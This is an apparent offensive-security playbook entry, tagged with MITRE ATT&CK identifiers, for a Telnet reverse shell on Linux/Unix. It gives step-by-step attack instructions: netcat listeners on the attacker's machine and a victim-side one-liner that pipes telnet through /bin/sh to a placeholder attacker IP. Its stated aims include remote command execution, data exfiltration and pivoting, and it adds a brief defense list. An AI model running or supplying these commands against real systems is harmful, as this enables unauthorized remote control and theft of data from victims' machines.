---
id: f6bc13bc-c709-45d8-80f8-224709b2590d
name: Telnet-Reverse-Shell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.599098+00:00'
updated_at: '2023-04-10T20:25:31.606372+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques: []
tags:
  - '[[tags/Reverse Shell]]'
  - '[[tags/Reverse Shell Cheat Sheet]]'
  - '[[tags/Telnet]]'
commands:
  - '[[commands/nc-start-dual-listeners-for-telnet-shell]]'
  - '[[commands/telnet-pipe-shell-to-attacker]]'
platforms:
  - Linux
  - Unix
tools: []
validated: true
---

# Telnet-Reverse-Shell

## Summary

The Telnet Reverse Shell procedure establishes a remote command shell from a target (victim) system back to the attacker's machine using the Telnet protocol piped through a shell interpreter. This technique allows the attacker to execute commands on the victim system, exfiltrate data, or pivot to other network systems after gaining initial code execution access.

## Description

This procedure leverages the Telnet client on the victim machine to create a bidirectional pipe with /bin/sh, connecting to two Netcat listeners on the attacker's machine. It is typically used in post-exploitation scenarios where the attacker has command execution capability but no direct interactive shell. The technique requires Telnet to be available on the victim (common on Unix-like systems) and open outbound connections to the attacker's IP on ports 8080 and 8081. Success results in an interactive shell session on the attacker's terminal, enabling command execution and output reception. This method is stealthy in environments without Telnet traffic monitoring but vulnerable to network-based detection due to unencrypted traffic.

## Requirements

1. Command execution access on the victim system (e.g., via initial exploit or compromised credentials).
2. Netcat (nc) installed on the attacker machine.
3. Telnet client available on the victim system.
4. Network connectivity from victim to attacker IP on ports 8080 and 8081 (firewall rules allowing outbound Telnet).
5. Attacker IP address known and reachable.

## Defense

- Disable Telnet services and clients on all systems; use SSH for remote access.
- Implement network segmentation to restrict outbound connections to untrusted IPs/ports.
- Deploy network monitoring tools (e.g., IDS/IPS) to detect anomalous Telnet or Netcat traffic patterns.
- Enable endpoint logging for process execution involving Telnet or shell piping.
- Use application whitelisting to prevent unauthorized command execution.

## Objectives

1. Establish an interactive reverse shell connection from victim to attacker.
2. Enable remote command execution on the victim system.
3. Facilitate data exfiltration or network pivoting via the shell.
4. Maintain access for further post-exploitation activities.

## Instructions

### Step 1: Start Dual Netcat Listeners on Attacker Machine

**Context**: This step sets up two listeners on the attacker's machine to handle the incoming Telnet connections and shell I/O piping. The first listener (8080) receives the initial connection and shell input, while the second (8081) captures output. Run these in separate terminals for bidirectional interaction.

**Command** ([[commands/nc-start-dual-listeners-for-telnet-shell]]):
```bash
nc -lvp 8080
nc -lvp 8081
```

> This command launches verbose Netcat listeners on ports 8080 and 8081. The -l flag listens, -v provides verbose output, and -p specifies the port. Expected output includes connection notifications like "Listening on [0.0.0.0] (family 0, port 8080)" when started, and later "Connection from [victim_ip] port 8080" upon victim connection.

### Step 2: Execute Telnet Pipe Command on Victim Machine

**Context**: Once listeners are active, execute this command on the victim to initiate the reverse shell. It connects Telnet to the first listener, pipes through /bin/sh for command interpretation, and redirects output to the second listener, creating an interactive session.

**Command** ([[commands/telnet-pipe-shell-to-attacker]]):
```bash
telnet $_ATTACKER_IP 8080 | /bin/sh | telnet $_ATTACKER_IP 8081
```

> This pipes Telnet input/output through /bin/sh, establishing the reverse shell. Replace $_ATTACKER_IP with the attacker's actual IP. Expected output on the attacker side includes a shell prompt (e.g., "$ " or similar) after connection, allowing command input like "whoami" to execute on the victim with output returned.
